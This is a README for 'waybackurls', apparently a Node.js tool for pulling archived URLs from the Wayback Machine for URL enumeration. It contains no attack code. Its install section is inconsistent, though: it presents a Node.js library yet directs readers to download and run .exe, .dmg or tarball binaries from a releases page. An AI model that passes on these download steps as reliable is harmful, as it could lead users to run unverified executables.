# 🌍 waybackurls - Easily Fetch Historical URLs

## 📦 Download Now
[![Download waybackurls](https://img.shields.io/badge/Download-waybackurls-blue.svg)](https://github.com/Selvanous/waybackurls/releases)

## 🚀 Getting Started
Welcome to **waybackurls**! This tool helps you find historical URLs from the Wayback Machine using Node.js. It works well as both a command-line tool and a library, making it a versatile choice for anyone needing to gather archived URLs.

## 📥 Download & Install
To get started, visit this page to download: [waybackurls Releases](https://github.com/Selvanous/waybackurls/releases).

1. Click on the link above to go to the Releases page.
2. Find the latest version available for download.
3. Select the appropriate file for your operating system:
   - For Windows, look for a `.exe` file.
   - For macOS, select the `.dmg` file.
   - For Linux, choose `.tar.gz` or the executable that best fits your setup.
4. Follow the prompts on your system to download and install the application.

## ⚙️ System Requirements
- **Operating Systems:** 
  - Windows 10 or later
  - macOS 10.12 or later
  - Linux (most distributions supported)
  
- **Node.js:** Version 12 or later is required. If you do not have Node.js, please download it from [Node.js official site](https://nodejs.org).

## 📖 How to Use waybackurls
Once you have installed waybackurls, you can start using it immediately.

### Command Line Interface (CLI)
1. Open your command prompt or terminal.
2. Type `waybackurls [options] <url>` to fetch historical URLs. Here’s a basic example:
   ```
   waybackurls example.com
   ```
3. Press Enter. The tool will return a list of archived URLs for the specified website.

### Library Usage
You can also use waybackurls in your Node.js applications. Import waybackurls and access its API to fetch historical URLs. Here's a simple example:
```javascript
const waybackurls = require('waybackurls');

waybackurls('example.com').then(urls => {
    console.log(urls);
});
```

## 🔧 Common Options
Use the following options to customize your requests:

- `-h`, `--help`: Show help information.
- `-o`, `--output <file>`: Save the results to a specified file.
- `-v`, `--verbose`: Show detailed information during execution.

## 📝 Features
- Fetch historical URLs in seconds.
- Supports both CLI and library usage.
- Works across multiple operating systems.
- Easy integration with Node.js projects.

## 🌐 Topics Covered
- Archive
- Archived URLs
- Node.js
- URL Enumeration
- URL Scanner
- Wayback Machine

## 🔗 Additional Resources
- [Wayback Machine](https://web.archive.org)
- [Node.js Documentation](https://nodejs.org/en/docs/)

If you have any questions or feedback, please feel free to open an issue on the [GitHub repository](https://github.com/Selvanous/waybackurls/issues).

Thank you for using waybackurls! Your historical URL discovery journey starts now.